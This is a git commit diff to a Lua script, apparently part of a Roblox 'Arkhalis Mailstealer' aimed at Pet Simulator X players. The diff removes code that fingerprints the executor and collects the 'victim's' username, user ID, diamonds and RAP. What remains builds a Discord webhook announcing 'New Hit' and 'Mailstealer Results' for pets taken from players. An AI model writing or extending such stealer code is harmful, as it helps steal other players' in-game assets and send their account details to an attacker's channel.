1bd6110b209937ad1f1cbc80bdc2b77807a7bb9b
Arkhalislua <130490495+Arkhalislua@users.noreply.github.com>
2023-05-11 18:19:21 +0200

    Update WebhookPetSended.lua

--- WebhookPetSended.lua
+++ WebhookPetSended.lua
@@ -1,54 +1,15 @@
-local function getexploit()
-	local exploit =
-		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
-		(secure_load and "Sentinel") or
-		(is_sirhurt_closure and "Sirhurt") or
-		(pebc_execute and "ProtoSmasher") or
-		(KRNL_LOADED and "Krnl") or
-		(WrapGlobal and "WeAreDevs") or
-		(isvm and "Proxo") or
-		(shadow_env and "Shadow") or
-		(jit and "EasyExploits") or
-		(getscriptenvs and "Calamari") or
-		(unit and not syn and "Unit") or
-		(OXYGEN_LOADED and "Oxygen U") or
-		(IsElectron and "Electron") or
-		("Unsupported")
-  
-	return exploit
-  end
-  
---// Execution Log
-if game.PlaceId == 6284583030 then
-	_G.GameIn = "Pet Simulator X"
-elseif game.PlaceId == 7722306047 then
-	_G.GameIn = "PSX Trading Plaza"
-elseif game.PlaceId == 10321372166 then
-	_G.GameIn = "PSX Hardcore"
-elseif game.PlaceId == 12610002282 then
-	_G.GameIn = "PSX Pro Trading Plaza"
-elseif game.PlaceId == 11725212117 then
-	_G.GameIn = "PSX Voice Trading Plaza"
-else
-	_G.GameIn = "❓ Couldn't find game"
-end
+
 local webhookcolor = "13369599"
-_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
-_G.PlrUserVictim = game.Players.LocalPlayer.Name
-_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
-_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
-_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
-_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
+
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**💽Arkhalis Pet DataBase💽**",
+	["content"]= "**🎁New Hit With Arkhalis🎁** || @here|| ",
 	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
 		["title"]= "`Arkhalis Mailstealer Results`",
-    ["description"]= "**Pet Sended**",
+		["description"]= "**Pet Sended (′ꈍωꈍ‵)**",
 		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
@@ -56,14 +17,6 @@ local msg = {
         ["height"] = 420,
         ["width"] = 420
         },
-		["fields"]= {
-        {
-          ["name"]= "**🐕Pet🐕**",
-          ["value"]= "```"..v.Name.."```",
-          ["inline"]= true
-        },
-
-      }
       
   }
   },
